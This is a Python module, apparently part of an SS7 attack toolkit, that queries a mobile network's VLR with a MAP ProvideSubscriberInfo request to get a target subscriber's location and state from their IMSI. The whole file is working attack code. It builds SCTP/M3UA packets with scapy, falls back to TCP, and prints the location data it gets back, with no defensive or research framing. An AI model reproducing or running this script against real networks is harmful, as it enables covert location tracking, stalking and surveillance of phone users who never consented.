#!/usr/bin/env python
"""
ProvideSubscriberInfo (PSI) Attack Module
Reliable location tracking via direct VLR query.
Supports both SCTP (raw) and TCP transport.
"""
import sys
import os
from scapy.all import *

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from ss7.attacks.ss7_layers import *
from ss7.attacks.map_layer import ProvideSubscriberInfo

def psi_main():
    print("\n" + "=" * 50)
    print(" ProvideSubscriberInfo (PSI) Attack")
    print(" Reliable Location Tracking")
    print("=" * 50 + "\n")

    print("[1] Connection Configuration")
    print("-" * 30)
    remote_ip = get_input("Target VLR IP", "10.0.0.1", validator=validate_ip)
    remote_port = int(get_input("Target Port", "2905"))
    
    print("\n[2] SS7 Configuration")
    print("-" * 30)
    opc = int(get_input("Your Point Code (OPC)", "1"))
    dpc = int(get_input("Target Point Code (DPC)", "2"))
    
    print("\n[3] Attack Parameters")
    print("-" * 30)
    target_imsi = get_input("Target IMSI", "286011234567890", validator=validate_imsi)
    
    print("\n" + "=" * 50)
    print(" Building MAP ProvideSubscriberInfo")
    print("=" * 50)
    
    psi = ProvideSubscriberInfo(target_imsi, request_location=True, request_state=True)
    tcap_data = psi.to_tcap_begin()
    
    print(f"[+] Target IMSI: {target_imsi}")
    print(f"[+] MAP Operation: ProvideSubscriberInfo (OpCode: 70)")
    print(f"[+] Request: Location + Subscriber State")

    # Transport selection
    print("\n[+] Transport Selection:")
    print("    1) SCTP (raw - requires root/Linux)")
    print("    2) TCP  (works everywhere)")
    transport = get_input("Transport mode", "2")

    if transport == "1":
        _sctp_psi(remote_ip, remote_port, opc, dpc, tcap_data)
    else:
        _tcp_psi(remote_ip, remote_port, opc, dpc, tcap_data)

    input("\nPress Enter to return...")


def _sctp_psi(remote_ip, remote_port, opc, dpc, tcap_data):
    """SCTP transport."""
    print(f"\n[+] Sending to {remote_ip}:{remote_port} (SCTP)...")
    try:
        init_pkt = IP(dst=remote_ip) / SCTP(sport=2905, dport=remote_port) / SCTPChunkInit()
        ans = sr1(init_pkt, timeout=5, verbose=0)
        
        if ans and ans.haslayer(SCTPChunkInitAck):
            print("[+] Connection established!")
            m3ua = M3UA(msg_class=1, msg_type=1)
            proto_data = M3UA_Param_Protocol_Data(opc=opc, dpc=dpc, si=3, ni=2)
            data_pkt = IP(dst=remote_ip) / SCTP(sport=2905, dport=remote_port) / \
                       SCTPChunkData(data=bytes(m3ua/proto_data) + tcap_data)
            map_ans = sr1(data_pkt, timeout=5, verbose=0)
            if map_ans:
                print("[+] Response received!")
                if map_ans.haslayer(Raw):
                    _parse_psi_response(map_ans[Raw].load)
            else:
                print("[-] No response.")
        else:
            print("[-] SCTP failed. Trying TCP fallback...")
            _tcp_psi(remote_ip, remote_port, opc, dpc, tcap_data)
    except Exception as e:
        print(f"[-] SCTP Error: {e}")
        print("[*] Trying TCP fallback...")
        _tcp_psi(remote_ip, remote_port, opc, dpc, tcap_data)


def _tcp_psi(remote_ip, remote_port, opc, dpc, tcap_data):
    """TCP transport fallback."""
    print("\n[+] Using TCP Transport...")
    try:
        from ss7.attacks.tcp_transport import tcp_attack
    except ImportError:
        sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        from tcp_transport import tcp_attack

    result = tcp_attack(remote_ip, remote_port, opc, dpc, tcap_data, called_ssn=7)

    print("\n" + "=" * 50)
    print(" ProvideSubscriberInfo Result")
    print("=" * 50)
    if result.get('success'):
        print("\033[32m[+] PSI response received!\033[0m")
        for key, val in result.items():
            if key not in ('success', 'raw', 'error', 'tcap'):
                print(f"\033[32m[+] {key.upper()}: {val}\033[0m")
        if result.get('map_error'):
            print(f"\033[31m[-] MAP Error: {result['map_error']} ({result.get('map_error_name', '')})\033[0m")
    else:
        print(f"\033[31m[-] {result.get('error', 'Unknown error')}\033[0m")


def _parse_psi_response(data):
    """Parse PSI response."""
    try:
        from ss7.attacks.tcp_transport import extract_addresses, parse_map_error
    except ImportError:
        from tcp_transport import extract_addresses, parse_map_error

    addrs = extract_addresses(data)
    if addrs:
        for key, val in addrs.items():
            print(f"\033[32m[+] {key.upper()}: {val}\033[0m")

    err_code, err_name = parse_map_error(data)
    if err_code is not None:
        print(f"\033[31m[-] MAP Error: {err_code} ({err_name})\033[0m")


if __name__ == "__main__":
    psi_main()
